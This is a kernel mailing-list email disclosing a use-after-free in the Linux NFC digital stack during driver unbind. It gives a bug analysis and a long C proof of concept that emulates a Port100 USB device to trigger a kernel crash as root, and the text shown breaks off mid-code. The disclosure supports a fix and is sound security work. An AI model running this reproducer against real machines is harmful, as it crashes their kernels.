Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=209.85.214.170
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1792999494;
	b=0gDLwOplofCIJ+TUrlktQVmSET4A7ND2tQJZsiKw3foek0XwzsfLk0zeavJBfCqvTAvb
	 rL13o6eal0uCqHbP88Tc90aJxFWxibgTSKT0zo2ETrOX2cbSO+LmmmWzXzRMBV50l/LO1
	 9+bAkeM3CK8aHTuRfjppRgUuvcAo76+t1FcrPNuKhfgSGj0KtFRIHT0yxM4HUp6Cty1ZO
	 BrjrC96kb2eHb5O1TigmDdaEnwkgOB3CI3wAG5q8LDLk/00MLHkgbM2QUswAguMCriH5Y
	 F4g+MQKG0tGWHCSDSSMvDmOZ3mi4H8LuKVX0syjyrLSSH3uI382h2jDz2XYQi/DnlfA==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1792999494;
	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
	 X-Forwarded-Encrypted:X-Gm-Message-State:X-Gm-Gg:X-Received:Received:
	 From:To:Cc:Subject:Date:Message-ID:MIME-Version:Content-Type:
	 Content-Transfer-Encoding:X-Mailer;
	bh=gJDBjtupISbYAFoo+SFIOZYpPcvQqGdM/GMzNlcN13E=;
	b=5XInUKIIOYq2nMMF8cdC+fhLXU7FgXMyqNOD8lJ/nv02UGJ7fdK+9EOqhhFuVU8UXLe/
	 n/MMZs5SnPuIFBMvvabbeZJzJwuhAtfuqX3yLCpqLXZqDG/mffDKWWnHoWsx4LUY0HarV
	 mPyWZBO8MblGvMQeVWE7Fu/SESKcET3TJ5VKFypduyvBv9WYIcr2Snr9T0s+GKOd9jqM1
	 J0hT2Bic8wMtdVafxUtwzNM9YGG/uhMkESkOv+s3B7JOGY8h4Z2hludObIPIq9KesG3X/
	 lt7A+PFtM755Rse+6yGmoz1/sQpURaG+qzD6PhnTiYYMKrTgLztcBw58gxM3yeg4njg==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=pass header.from=gmail.com;
	spf=pass smtp.mailfrom=gmail.com;
	dkim=pass header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20251104 header.b="BVd/RZc5";
	arc=none smtp.remote-ip=209.85.214.170
Received: from mail-pl1-f170.google.com (mail-pl1-f170.google.com [209.85.214.170])
	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with UTF8SMTPS id 55A4D606A323
	for <stable@vger.kernel.org>; Mon, 26 Oct 2026 07:24:53 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 55A4D606A323
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key, unprotected) header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20251104 header.b=BVd/RZc5
Received: by mail-pl1-f170.google.com with SMTP id d9443c01a7336-2e5378b281aso18052015ad.2
        for <stable@vger.kernel.org>; Mon, 26 Oct 2026 00:24:53 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1792999493; x=1793604293; darn=vger.kernel.org;
        h=content-transfer-encoding:content-type:mime-version:message-id:date
         :subject:cc:to:from:from:to:cc:subject:date:message-id:reply-to
         :content-type;
        bh=gJDBjtupISbYAFoo+SFIOZYpPcvQqGdM/GMzNlcN13E=;
        b=BVd/RZc5erBWyJVkrt6t770RdUMV3yGRpFBcxtGYtXJZsJfza4E7maS7Xq+ozOx99C
         nxxSiPlXTTFo98CEK5CHzWutwGVCZLqmJGq1rZ5yuojpiCzrFKNhGkBkfncbbM9j8NA5
         /WFG31fTUip+d/vXR+WiN9VGfTRkLl22S8I2I6lCnmgAZItpP35vWvB6g0VUDavhrnwq
         XrU2FdxFR/Aot4NeQPiId3YwfecyUNyz8PAXQgsAy1lbvFAvdeoG0/nXSGz4mUo2zB51
         oUVhL24KqDgGAz4tbRQuNzJxdTWPBRVDkM8g3+s2AWwxF0Vg4neWV9ZbMyAXBr9Kh3Lc
         u+ew==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1792999493; x=1793604293;
        h=content-transfer-encoding:content-type:mime-version:message-id:date
         :subject:cc:to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject
         :date:message-id:reply-to:content-type;
        bh=gJDBjtupISbYAFoo+SFIOZYpPcvQqGdM/GMzNlcN13E=;
        b=wfAxRniF/5o7B/UkBlDSR+fOiL/2lqtkqfQCjhE7d/9cRyn31Z6uo5RUYOm0aO+wld
         TPLOTVAQ8PZVeJp5v069CWzsHMaH4rjA6ak1Ki7ECjMONs9TkM57yyckONgcY4084KL3
         nkhsXSFZ9iE7tcmUwNjGZ1WQ1OlneVtTG+B72hJ6kl1fDm0pUb8tI7PSSivWY65KzjU+
         CjPmt7ks+iKEJ3gTW/QbvZjmjSkiqig3+5MF6IY5X49bBNtnKdIwyCmYIGjt0UOOMyjn
         U867mwcogbgdw01/RwmWxS1oVOOM+M2O2NLyq5GbH5/z310UU+VMFNCRAaZWrSBfLdnA
         RsbA==
X-Forwarded-Encrypted: i=1; AKwUvBzd8YMht0RxWtdsPQmdbNcoGmVqmXaIYBsBGqr/C+mOJ5DGJXksZGK1q81ZiBmNVZ+kmq4oVjg=@vger.kernel.org
X-Gm-Message-State: AFq9FYKHvhfYJmUJofKwqR55mOx8HVjJ1iXx723rfuvVTALhXPvW0qwP
	pgRykyX0KrVmWSPHrHab76rN7bzJc4RcZmVnh4EdV2uXMlCqMnLTGGJMxgmHEQ5sgOs=
X-Gm-Gg: AYBFou0YYZyaKgNTGM4sOyU/u/q0ou/Blu0BatKhr06k+crBSmroNoUmffbkrqmSe8t
	XBWlQZRyD0Y4yFV2pTp7BRuodEwCr+ZXxxwZR5BRWh0pIGmotO4gh/O9eLKwEm3fsEqI010oOla
	9nSvYVs4cuSmQRi7Emx6WluSN5OESBj4JfHDi5GWocEBkIO9ap4ZpSI6dGetY7Ok+termetWTds
	BYpg/Bk3oLrdHIuK905qdSslD4wwc2Ig2Xdr5b/EoTln7hrBuulUP+FvPPmGnhgGaBnpOgFwZ3Y
	IqzuwMatm+KXGDcYDRNBNO6kRNLXZMzgZ7aKA2IlTey9WN2Ysj8w/F6UhidAn568Mz7gV5AAm7H
	UQjmHr+jUC5ykKbeMpF6TTkZ/0gLOXgsdikw862+hNj5c+N04Y/xi6pvNp16dIittq8Q+XQV43S
	WKZn5AoESb5qcIHQzSWmWWmdOe1jd+RaJfIlnePFxq1+Nz3L3c99SP+STWcpNwQ/wJNY88U91G8
	5LD2LQosPWb3nK0nRU6J8LTcfLXgs+jPSsps47q4TUpBSGUjTUNTrhQA1fT9fMTtP3KJXxiSCo2
	F535AyDC6KPW3HEZwbZs79hU+nNacd5eS7e+GuM=
X-Received: by 2002:a17:903:1b08:b0:2e9:8bd4:577d with SMTP id d9443c01a7336-2ea9c875126mr57590735ad.37.1792999492358;
        Mon, 26 Oct 2026 00:24:52 -0700 (PDT)
Received: from 822-cover.eml (awork078078.netvigator.com. [203.198.250.78])
        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2ea9b14d1ddsm12862885ad.40.2026.10.26.00.24.42
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 26 Oct 2026 00:24:51 -0700 (PDT)
From: Yuqi Xu <xuyuqiabc@gmail.com>
To: netdev@vger.kernel.org, oe-linux-nfc@lists.linux.dev
Cc: David Heidelberg <david@ixit.cz>, "David S. Miller" <davem@davemloft.net>, Eric Dumazet <edumazet@google.com>, Jakub Kicinski <kuba@kernel.org>, Paolo Abeni <pabeni@redhat.com>, Simon Horman <horms@kernel.org>, stable@vger.kernel.org, Vega <vega@nebusec.ai>, Ren Wei <weir@nebusec.ai>, xuyq21@lenovo.com, Mark Greer <mgreer@animalcreek.com>, "Uwe Kleine-König (The Capable Hub)" <u.kleine-koenig@baylibre.com>, Ian Ray <ian.ray@gehealthcare.com>, Dmitry Torokhov <dmitry.torokhov@gmail.com>, Thierry Escande <thierry.escande@linux.intel.com>, Samuel Ortiz <sameo@linux.intel.com>
Subject: [PATCH net 0/1] nfc: digital: fix use-after-free in unregister
Date: Mon, 26 Oct 2026 15:24:07 +0800
Message-ID: <cover.1791172164.git.xuyuqiabc@gmail.com>
X-Mailing-List: stable@vger.kernel.org
List-Id: <stable.vger.kernel.org>
List-Post: <mailto:stable@vger.kernel.org>
List-Help: <mailto:stable+help@vger.kernel.org>
List-Subscribe: <mailto:stable+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
List-Owner: <mailto:stable+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Mailer: git-send-email 2.56.0

Hi Linux kernel maintainers,

We found and validated an issue in net/nfc/digital_core.c. Triggering
it requires root. The reproducer uses raw-gadget and driver unbind,
which fail from an unprivileged user and from a user namespace.

This bug is tracked at: https://bugtracker.nebusec.ai/f/822

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

nfc_digital_unregister_device() cancels the poll, command, and
completion work items, then frees every digital_cmd still queued. It
does not abort a command the driver has already accepted.

digital_wq_cmd() passes that object to the driver as the completion
argument. digital_send_cmd_complete() later stores the response with
cmd->resp = resp. Once unregister has freed cmd, that store is a
use-after-free.

On Port100 the URB handler does not call into the digital stack
itself. It queues port100_wq_cmd_complete. Disconnect then returns,
and devm frees struct port100 while that embedded work_struct is
still active. The log below is the resulting ODEBUG warning, with
panic_on_warn set. That same work is what calls back into the freed
command.

trf7970a has the same problem through a delayed timeout work and its
IRQ thread. Its MD listening state was not handled by abort or
shutdown, so the patch also stops that timer and handles the state
before the device is released.

Reproducer:

  make
  # as root in the guest
  ./poc.sh

poc.sh enables panic_on_warn and runs the static binary built from
the poc.c below. It emulates a Sony Port100 on dummy_hcd, brings the
NFC device up, starts a poll, withholds the in-flight IN_COMM_RF
response, and unbinds drivers/port100. The supplied write-up reports
that this crashes reliably as root.

------BEGIN poc.c------
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/genetlink.h>
#include <linux/netlink.h>
#include <linux/nfc.h>
#include <linux/usb/ch9.h>
#include <pthread.h>
#include <sched.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#ifndef ARRAY_SIZE
#define ARRAY_SIZE(x) (sizeof(x) / sizeof((x)[0]))
#endif

#define UDC_NAME_LENGTH_MAX 128
struct usb_raw_init {
	uint8_t driver_name[UDC_NAME_LENGTH_MAX];
	uint8_t device_name[UDC_NAME_LENGTH_MAX];
	uint8_t speed;
};

enum usb_raw_event_type {
	USB_RAW_EVENT_INVALID = 0,
	USB_RAW_EVENT_CONNECT = 1,
	USB_RAW_EVENT_CONTROL = 2,
};

struct usb_raw_event {
	uint32_t type;
	uint32_t length;
	uint8_t data[0];
};

struct usb_raw_ep_io {
	uint16_t ep;
	uint16_t flags;
	uint32_t length;
	uint8_t data[0];
};

#define USB_RAW_IOCTL_INIT _IOW('U', 0, struct usb_raw_init)
#define USB_RAW_IOCTL_RUN _IO('U', 1)
#define USB_RAW_IOCTL_EVENT_FETCH _IOR('U', 2, struct usb_raw_event)
#define USB_RAW_IOCTL_EP0_WRITE _IOW('U', 3, struct usb_raw_ep_io)
#define USB_RAW_IOCTL_EP0_READ _IOWR('U', 4, struct usb_raw_ep_io)
#define USB_RAW_IOCTL_EP_ENABLE _IOW('U', 5, struct usb_endpoint_descriptor)
#define USB_RAW_IOCTL_EP_WRITE _IOW('U', 7, struct usb_raw_ep_io)
#define USB_RAW_IOCTL_EP_READ _IOWR('U', 8, struct usb_raw_ep_io)
#define USB_RAW_IOCTL_CONFIGURE _IO('U', 9)
#define USB_RAW_IOCTL_VBUS_DRAW _IOW('U', 10, uint32_t)

#define USB_MAX_PACKET_SIZE 4096
struct usb_raw_control_event {
	struct usb_raw_event inner;
	struct usb_ctrlrequest ctrl;
	uint8_t data[USB_MAX_PACKET_SIZE];
};

struct usb_raw_ep_io_data {
	struct usb_raw_ep_io inner;
	uint8_t data[USB_MAX_PACKET_SIZE];
};

#define NLA_ALIGNTO 4
#define NLA_ALIGN(len) (((len) + NLA_ALIGNTO - 1) & ~(NLA_ALIGNTO - 1))

static uint16_t le16_checksum_rule(uint16_t value)
{
	uint8_t low = (uint8_t)(value & 0xff);
	uint8_t high = (uint8_t)((value >> 8) & 0xff);
	return (uint8_t)(~(low + high) + 1);
}

static uint8_t sum_checksum_rule(const uint8_t *data, size_t len)
{
	uint8_t sum = 0;
	size_t i;

	for (i = 0; i < len; i++)
		sum += data[i];

	return (uint8_t)(~sum + 1);
}

struct port100_ctx {
	int fd;
	int ep_in;
	int ep_out;
	volatile bool configured;
	volatile bool running;
	volatile bool saw_in_comm_rf;
	pthread_mutex_t lock;
	pthread_cond_t cond;
};

struct hog_ctx {
	volatile bool run;
	int cpu;
};

static const uint8_t ack_frame[6] = {0x00, 0x00, 0xff, 0x00, 0xff, 0x00};

static int raw_ep0_write(int fd, const void *data, uint32_t len)
{
	struct usb_raw_ep_io_data io;

	memset(&io, 0, sizeof(io));
	io.inner.ep = 0;
	io.inner.flags = 0;
	if (len > sizeof(io.data))
		len = 0;
	io.inner.length = len;
	if (len)
		memcpy(io.data, data, len);

	return ioctl(fd, USB_RAW_IOCTL_EP0_WRITE, &io);
}

static int raw_ep0_read(int fd, uint32_t len)
{
	struct usb_raw_ep_io_data io;

	memset(&io, 0, sizeof(io));
	io.inner.ep = 0;
	io.inner.flags = 0;
	if (len > sizeof(io.data))
		len = sizeof(io.data);
	io.inner.length = len;

	return ioctl(fd, USB_RAW_IOCTL_EP0_READ, &io);
}

static int raw_ep_write(int fd, int ep, const void *data, uint32_t len)
{
	struct usb_raw_ep_io_data io;

	memset(&io, 0, sizeof(io));
	io.inner.ep = ep;
	io.inner.flags = 0;
	if (len > sizeof(io.data))
		len = sizeof(io.data);
	io.inner.length = len;
	if (len)
		memcpy(io.data, data, len);

	return ioctl(fd, USB_RAW_IOCTL_EP_WRITE, &io);
}

static int raw_ep_read(int fd, int ep, uint8_t *buf, uint32_t *len)
{
	struct usb_raw_ep_io_data io;
	uint32_t in_len = *len;
	int rv;

	memset(&io, 0, sizeof(io));
	io.inner.ep = ep;
	io.inner.flags = 0;
	if (in_len > sizeof(io.data))
		in_len = sizeof(io.data);
	io.inner.length = in_len;

	rv = ioctl(fd, USB_RAW_IOCTL_EP_READ, &io);
	if (rv < 0)
		return rv;

	if (io.inner.length > *len)
		io.inner.length = *len;
	memcpy(buf, io.data, io.inner.length);
	*len = io.inner.length;

	return 0;
}

static int send_ack(struct port100_ctx *ctx)
{
	return raw_ep_write(ctx->fd, ctx->ep_in, ack_frame, sizeof(ack_frame));
}

static size_t build_port100_response(uint8_t cmd, const uint8_t *payload,
				     size_t payload_len, uint8_t *out,
				     size_t out_sz)
{
	uint16_t datalen;
	size_t total;
	uint8_t dsum;

	datalen = (uint16_t)(2 + payload_len);
	total = 8 + datalen + 2;
	if (out_sz < total)
		return 0;

	out[0] = 0x00;
	out[1] = 0x00;
	out[2] = 0xff;
	out[3] = 0xff;
	out[4] = 0xff;
	out[5] = (uint8_t)(datalen & 0xff);
	out[6] = (uint8_t)((datalen >> 8) & 0xff);
	out[7] = (uint8_t)le16_checksum_rule(datalen);
	out[8] = 0xd7;
	out[9] = (uint8_t)(cmd + 1);
	if (payload_len)
		memcpy(&out[10], payload, payload_len);
	dsum = sum_checksum_rule(&out[8], datalen);
	out[8 + datalen] = dsum;
	out[8 + datalen + 1] = 0x00;

	return total;
}

static int send_port100_response(struct port100_ctx *ctx, uint8_t cmd,
				 const uint8_t *payload, size_t payload_len)
{
	uint8_t frame[128];
	size_t len;

	len = build_port100_response(cmd, payload, payload_len, frame,
				     sizeof(frame));
	if (!len)
		return -EINVAL;

	return raw_ep_write(ctx->fd, ctx->ep_in, frame, (uint32_t)len);
}

static bool is_out_control_request(const struct usb_ctrlrequest *ctrl)
{
	return !(ctrl->bRequestType & USB_DIR_IN);
}

static void fill_string_desc(uint8_t idx, uint8_t *buf, uint16_t *len)
{
	static const uint8_t lang0[] = {0x04, USB_DT_STRING, 0x09, 0x04};
	const char *s;
	size_t i;
	size_t n;

	if (idx == 0) {
		memcpy(buf, lang0, sizeof(lang0));
		*len = sizeof(lang0);
		return;
	}

	switch (idx) {
	case 1:
		s = "Sony";
		break;
	case 2:
		s = "RC-S380";
		break;
	case 3:
		s = "0001";
		break;
	default:
		*len = 0;
		return;
	}

	n = strlen(s);
	buf[0] = (uint8_t)(2 + n * 2);
	buf[1] = USB_DT_STRING;
	for (i = 0; i < n; i++) {
		buf[2 + i * 2] = (uint8_t)s[i];
		buf[3 + i * 2] = 0;
	}
	*len = buf[0];
}

static int handle_control_event(struct port100_ctx *ctx,
				const struct usb_ctrlrequest *ctrl)
{
	uint16_t w_value = le16toh(ctrl->wValue);
	uint16_t w_index = le16toh(ctrl->wIndex);
	uint16_t w_length = le16toh(ctrl->wLength);
	uint8_t desc_type = (uint8_t)(w_value >> 8);
	uint8_t desc_idx = (uint8_t)(w_value & 0xff);
	uint8_t resp[256];
	uint16_t resp_len = 0;
	int rv;

	static const struct usb_device_descriptor dev_desc = {
		.bLength = sizeof(struct usb_device_descriptor),
		.bDescriptorType = USB_DT_DEVICE,
		.bcdUSB = 0x0200,
		.bDeviceClass = 0,
		.bDeviceSubClass = 0,
		.bDeviceProtocol = 0,
		.bMaxPacketSize0 = 64,
		.idVendor = 0x054c,
		.idProduct = 0x06c1,
		.bcdDevice = 0x0001,
		.iManufacturer = 1,
		.iProduct = 2,
		.iSerialNumber = 3,
		.bNumConfigurations = 1,
	};

	struct {
		struct usb_config_descriptor config;
		struct usb_interface_descriptor intf;
		struct usb_endpoint_descriptor ep_out;
		struct usb_endpoint_descriptor ep_in;
	} __attribute__((packed)) cfg_desc = {
		.config = {
			.bLength = sizeof(struct usb_config_descriptor),
			.bDescriptorType = USB_DT_CONFIG,
			.wTotalLength = sizeof(cfg_desc),
			.bNumInterfaces = 1,
			.bConfigurationValue = 1,
			.iConfiguration = 0,
			.bmAttributes = USB_CONFIG_ATT_ONE,
			.bMaxPower = 50,
		},
		.intf = {
			.bLength = sizeof(struct usb_interface_descriptor),
			.bDescriptorType = USB_DT_INTERFACE,
			.bInterfaceNumber = 0,
			.bAlternateSetting = 0,
			.bNumEndpoints = 2,
			.bInterfaceClass = USB_CLASS_VENDOR_SPEC,
			.bInterfaceSubClass = 0,
			.bInterfaceProtocol = 0,
			.iInterface = 0,
		},
		.ep_out = {
			.bLength = sizeof(struct usb_endpoint_descriptor),
			.bDescriptorType = USB_DT_ENDPOINT,
			.bEndpointAddress = 0x02,
			.bmAttributes = USB_ENDPOINT_XFER_BULK,
			.wMaxPacketSize = 512,
			.bInterval = 0,
		},
		.ep_in = {
			.bLength = sizeof(struct usb_endpoint_descriptor),
			.bDescriptorType = USB_DT_ENDPOINT,
			.bEndpointAddress = 0x81,
			.bmAttributes = USB_ENDPOINT_XFER_BULK,
			.wMaxPacketSize = 512,
			.bInterval = 0,
		},
	};

	if ((ctrl->bRequestType & USB_TYPE_MASK) == USB_TYPE_STANDARD) {
		switch (ctrl->bRequest) {
		case USB_REQ_GET_DESCRIPTOR:
			switch (desc_type) {
			case USB_DT_DEVICE:
				memcpy(resp, &dev_desc, sizeof(dev_desc));
				resp_len = sizeof(dev_desc);
				break;
			case USB_DT_CONFIG:
				memcpy(resp, &cfg_desc, sizeof(cfg_desc));
				resp_len = sizeof(cfg_desc);
				break;
			case USB_DT_STRING:
				fill_string_desc(desc_idx, resp, &resp_len);
				break;
			default:
				resp_len = 0;
				break;
			}
			break;
		case USB_REQ_SET_CONFIGURATION:
			if (w_value == 1 && !ctx->configured) {
				struct usb_endpoint_descriptor ep;
				uint32_t power = 250;

				ioctl(ctx->fd, USB_RAW_IOCTL_VBUS_DRAW, power);
				ioctl(ctx->fd, USB_RAW_IOCTL_CONFIGURE, 0);

				memset(&ep, 0, sizeof(ep));
				ep.bLength = sizeof(ep);
				ep.bDescriptorType = USB_DT_ENDPOINT;
				ep.bEndpointAddress = 0x81;
				ep.bmAttributes = USB_ENDPOINT_XFER_BULK;
				ep.wMaxPacketSize = htole16(512);
				ctx->ep_in = ioctl(ctx->fd, USB_RAW_IOCTL_EP_ENABLE, &ep);

				memset(&ep, 0, sizeof(ep));
				ep.bLength = sizeof(ep);
				ep.bDescriptorType = USB_DT_ENDPOINT;
				ep.bEndpointAddress = 0x02;
				ep.bmAttributes = USB_ENDPOINT_XFER_BULK;
				ep.wMaxPacketSize = htole16(512);
				ctx->ep_out = ioctl(ctx->fd, USB_RAW_IOCTL_EP_ENABLE, &ep);

				if (ctx->ep_in >= 0 && ctx->ep_out >= 0)
					ctx->configured = true;
			}
			break;
		case USB_REQ_GET_INTERFACE:
			resp[0] = 0;
			resp_len = 1;
			break;
		case USB_REQ_SET_INTERFACE:
			break;
		default:
			break;
		}
	}

	if (is_out_control_request(ctrl))
		rv = raw_ep0_read(ctx->fd, w_length);
	else {
		if (resp_len > w_length)
			resp_len = w_length;
		rv = raw_ep0_write(ctx->fd, resp, resp_len);
	}

	(void)w_index;
	return rv;
}

static void *bulk_thread_fn(void *arg)
{
	struct port100_ctx *ctx = arg;
	uint8_t inbuf[USB_MAX_PACKET_SIZE];
	uint8_t payload[16];

	while (ctx->running) {
		uint32_t len = sizeof(inbuf);
		int rv;
		uint8_t cmd;

		rv = raw_ep_read(ctx->fd, ctx->ep_out, inbuf, &len);
		if (rv < 0) {
			if (ctx->running)
				fprintf(stderr, "ep_read failed: %d (%s)\n", errno,
					strerror(errno));
			break;
		}

		if (len < 10)
			continue;
		cmd = inbuf[9];
		fprintf(stderr, "[usb] cmd 0x%02x len=%u\n", cmd, len);

		if (cmd == 0x04) {
			pthread_mutex_lock(&ctx->lock);
			ctx->saw_in_comm_rf = true;
			pthread_cond_broadcast(&ctx->cond);
			pthread_mutex_unlock(&ctx->lock);
			fprintf(stderr, "[usb] saw IN_COMM_RF, withholding ack/resp\n");
			continue;
		}

		if (send_ack(ctx) < 0) {
			fprintf(stderr, "send_ack failed: %s\n", strerror(errno));
			break;
		}

		switch (cmd) {
		case 0x28: {
			uint64_t mask = htobe64(0x3);
			if (send_port100_response(ctx, cmd, (const uint8_t *)&mask,
						 sizeof(mask)) < 0)
				goto out;
			break;
		}
		case 0x20: {
			uint16_t fw = htole16(0x0101);
			if (send_port100_response(ctx, cmd, (const uint8_t *)&fw,
						 sizeof(fw)) < 0)
				goto out;
			break;
		}
		default:
			payload[0] = 0x00;
			if (send_port100_response(ctx, cmd, payload, 1) < 0)
				goto out;
			break;
		}
	}

out:
	return NULL;
}

static int choose_udc(char *out, size_t out_sz)
{
	DIR *d;
	struct dirent *de;

	d = opendir("/sys/class/udc");
	if (!d)
		return -1;

	while ((de = readdir(d)) != NULL) {
		if (de->d_name[0] == '.')
			continue;
		if (strncmp(de->d_name, "dummy_udc.", 10) == 0) {
			snprintf(out, out_sz, "%s", de->d_name);
			closedir(d);
			return 0;
		}
	}

	closedir(d);
	return -1;
}

static int setup_raw_gadget(struct port100_ctx *ctx)
{
	struct usb_raw_init arg;
	char udc_name[128] = {0};
	int rv;

	ctx->fd = open("/dev/raw-gadget", O_RDWR);
	if (ctx->fd < 0)
		return -1;

	if (choose_udc(udc_name, sizeof(udc_name)) < 0)
		snprintf(udc_name, sizeof(udc_name), "dummy_udc.0");

	memset(&arg, 0, sizeof(arg));
	strncpy((char *)arg.driver_name, "dummy_udc", sizeof(arg.driver_name) - 1);
	strncpy((char *)arg.device_name, udc_name, sizeof(arg.device_name) - 1);
	arg.speed = USB_SPEED_HIGH;

	rv = ioctl(ctx->fd, USB_RAW_IOCTL_INIT, &arg);
	if (rv < 0)
		return -1;
	rv = ioctl(ctx->fd, USB_RAW_IOCTL_RUN, 0);
	if (rv < 0)
		return -1;

	fprintf(stderr, "raw gadget running on %s\n", udc_name);
	return 0;
}

static int wait_until_configured(struct port100_ctx *ctx, int timeout_sec)
{
	struct timespec start;

	clock_gettime(CLOCK_MONOTONIC, &start);

	while (!ctx->configured) {
		struct usb_raw_control_event event;
		struct timespec now;
		int elapsed;
		int rv;

		memset(&event, 0, sizeof(event));
		event.inner.length = sizeof(event.ctrl) + sizeof(event.data);
		rv = ioctl(ctx->fd, USB_RAW_IOCTL_EVENT_FETCH, &event);
		if (rv < 0)
			return -1;

		if (event.inner.type != USB_RAW_EVENT_CONTROL)
			continue;

		if (handle_control_event(ctx, &event.ctrl) < 0)
			return -1;

		clock_gettime(CLOCK_MONOTONIC, &now);
		elapsed = (int)(now.tv_sec - start.tv_sec);
		if (elapsed > timeout_sec)
			return -1;
	}

	fprintf(stderr, "raw gadget configured: ep_in=%d ep_out=%d\n",
		ctx->ep_in, ctx->ep_out);
	return 0;
}

static int scan_nfc_indices(int *out, int max)
{
	DIR *d;
	struct dirent *de;
	int n = 0;

	d = opendir("/sys/class/nfc");
	if (!d)
		return 0;

	while ((de = readdir(d)) != NULL) {
		if (strncmp(de->d_name, "nfc", 3) != 0)
			continue;
		if (n < max)
			out[n++] = atoi(de->d_name + 3);
	}

	closedir(d);
	return n;
}

static int wait_new_nfc_index(int baseline_max, int timeout_sec)
{
	int i;
	for (i = 0; i < timeout_sec * 20; i++) {
		int idx[64];
		int n = scan_nfc_indices(idx, ARRAY_SIZE(idx));
		int j;

		for (j = 0; j < n; j++) {
			if (idx[j] > baseline_max)
				return idx[j];
		}
		usleep(50000);
	}
	return -1;
}

static int find_port100_iface(char *out, size_t out_sz)
{
	DIR *d;
	struct dirent *de;

	d = opendir("/sys/bus/usb/drivers/port100");
	if (!d)
		return -1;

	while ((de = readdir(d)) != NULL) {
		if (de->d_name[0] == '.')
			continue;
		if (!strchr(de->d_name, ':'))
			continue;
		snprintf(out, out_sz, "%s", de->d_name);
		closedir(d);
		return 0;
	}

	closedir(d);
	return -1;
}

static int unbind_port100(void)
{
	char iface[128];
	int fd;
	size_t len;

	if (find_port100_iface(iface, sizeof(iface)) < 0)
		return -1;

	fd = open("/sys/bus/usb/drivers/port100/unbind", O_WRONLY);
	if (fd < 0)
		return -1;

	len = strlen(iface);
	if (write(fd, iface, len) != (ssize_t)len) {
		close(fd);
		return -1;
	}

	close(fd);
	return 0;
}

static int set_thread_realtime(int prio)
{
	struct sched_param sp;

	memset(&sp, 0, sizeof(sp));
	sp.sched_priority = prio;
	return sched_setscheduler(0, SCHED_FIFO, &sp);
}

static void *hog_thread_fn(void *arg)
{
	struct hog_ctx *hog = arg;
	cpu_set_t cpus;
	struct sched_param sp;

	CPU_ZERO(&cpus);
	CPU_SET(hog->cpu, &cpus);
	pthread_setaffinity_np(pthread_self(), sizeof(cpus), &cpus);

	memset(&sp, 0, sizeof(sp));
	sp.sched_priority = 90;
	pthread_setschedparam(pthread_self(), SCHED_FIFO, &sp);

	while (hog->run)
		asm volatile("" : : : "memory");

	return NULL;
}

static int nl_sock_open(uint32_t *seq_out)
{
	struct sockaddr_nl addr;
	int fd;

	fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
	if (fd < 0)
		return -1;

	memset(&addr, 0, sizeof(addr));
	addr.nl_family = AF_NETLINK;
	addr.nl_pid = (uint32_t)getpid();
	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
		close(fd);
		return -1;
	}

	*seq_out = 1;
	return fd;
}

static int nla_put(struct nlmsghdr *nlh, size_t maxlen, uint16_t type,
		   const void *data, uint16_t len)
{
	size_t offset;
	size_t attr_len;
	size_t total_len;
	struct nlattr *attr;

	offset = NLMSG_ALIGN(nlh->nlmsg_len);
	attr_len = sizeof(struct nlattr) + len;
	total_len = offset + NLA_ALIGN(attr_len);
	if (total_len > maxlen)
		return -1;

	attr = (struct nlattr *)((uint8_t *)nlh + offset);
	attr->nla_type = type;
	attr->nla_len = attr_len;
	memcpy((uint8_t *)attr + sizeof(struct nlattr), data, len);
	memset((uint8_t *)attr + attr_len, 0, NLA_ALIGN(attr_len) - attr_len);

	nlh->nlmsg_len = total_len;
	return 0;
}

static int nl_send_recv_ack(int fd, struct nlmsghdr *nlh)
{
	struct sockaddr_nl nladdr;
	uint8_t buf[8192];
	struct iovec iov;
	struct msghdr msg;
	uint32_t seq = nlh->nlmsg_seq;

	memset(&nladdr, 0, sizeof(nladdr));
	nladdr.nl_family = AF_NETLINK;

	iov.iov_base = nlh;
	iov.iov_len = nlh->nlmsg_len;

	memset(&msg, 0, sizeof(msg));
	msg.msg_name = &nladdr;
	msg.msg_namelen = sizeof(nladdr);
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;

	if (sendmsg(fd, &msg, 0) < 0)
		return -1;

	for (;;) {
		ssize_t ret;
		struct nlmsghdr *h;

		ret = recv(fd, buf, sizeof(buf), 0);
		if (ret < 0)
			return -1;

